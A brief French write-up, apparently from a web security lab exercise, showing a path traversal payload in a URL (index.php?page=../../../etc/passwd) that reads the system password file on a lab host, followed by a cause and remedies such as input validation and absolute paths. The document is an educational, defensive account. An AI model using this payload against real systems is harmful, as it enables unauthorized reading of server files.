home/ dans la barre d'adresse 
http://10.12.248.97/index.php?page=../../../../../../../../../../../../etc/passwd

## Comment ?

Le site est mal sécurisé car le code PHP ne vérifie pas ce que tu demandes dans l'URL.
On peut acceder aux fichiers en dehors des fichiers du server.

## Comment l'éviter ? 
On doit valider les entrées de l'utilisateur et on peut bannir les caractères spéciaux comme '..'
On peut aussi changer les permissions des fichiers ou travailler en chemin absolu.
